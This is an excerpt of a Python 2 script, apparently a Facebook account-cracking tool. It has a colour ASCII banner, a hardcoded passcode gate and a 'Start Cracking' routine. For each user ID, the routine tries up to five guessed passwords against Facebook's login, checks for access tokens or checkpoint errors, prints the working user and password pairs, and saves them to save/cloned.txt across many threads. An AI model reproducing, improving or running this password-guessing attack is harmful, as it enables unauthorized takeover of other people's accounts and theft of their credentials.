...
\033[1;92m/888             d8888 8888888b. 8888888 
\033[1;92m888            d88888 888  "Y88b  888   
\033[1;92m888           d88P888 888    888  888   
\033[1;92m888          d88P 888 888    888  888   
\033[1;92m888         d88P  888 888    888  888   
\033[1;92m888        d88P   888 888    888  888   
\033[1;92m888       d8888888888 888  .d88P  888   
\033[1;92m88888888 d88P     888 8888888P" 8888888 
...
\033[1;91m \o/            o/         \o    \o/      /       |   
 \033[1;91m |            /v           v\    |      o        o   
 \033[1;91m/ \ _\o__/_  />             <\  / \  __/>      __|>_ 
                                                      
                                                      
                                                      
 
                                     
  \033[1;92mFacebook  LADIII BALOCH                                  
  \033[1;92mAuthore        LODIND....                           
  \033[1;92mFROME.     BALOCHISTAN
  \033[1;97m             SEE MORE....     
"""
Username = "LADI"
CorrectPasscode = "LADI"
...
while (loop == 'true'):
    ...
    if (passcode == CorrectPasscode):
            ...
            os.system('xdg-open https://github.com/MrQurbi')
...
def login():
    os.system('clear')
    print logo1
    print "\033[1;92m[A]\x1b[1;92mStart"
    time.sleep(0.05)
    print '\x1b[1;92m[B]\033[1;92m BACK'
    pilih_login()

def pilih_login():
    peak = raw_input("\n\033[1;94mCHOOSE: \033[1;94m")
    if peak =="":
...
def action():
    ...
    jalan ("\033[1;95m Start Cracking  Loding...")
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;91m(LADI_CP) ' + k + c + user + '  |  ' + pass1
                    ...
                    if 'access_token' in q:
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;91m(LADI_CP) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            ...
                            if 'access_token' in q:
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;91m(LADI_CP) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    if 'access_token' in q:
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;91m(LADI_CP) ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            ...
                                            if 'access_token' in q:
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;91m(LADI__CP) ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
    ...
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'Hamayun Process Has Been Completedâ–ˆ...100%'
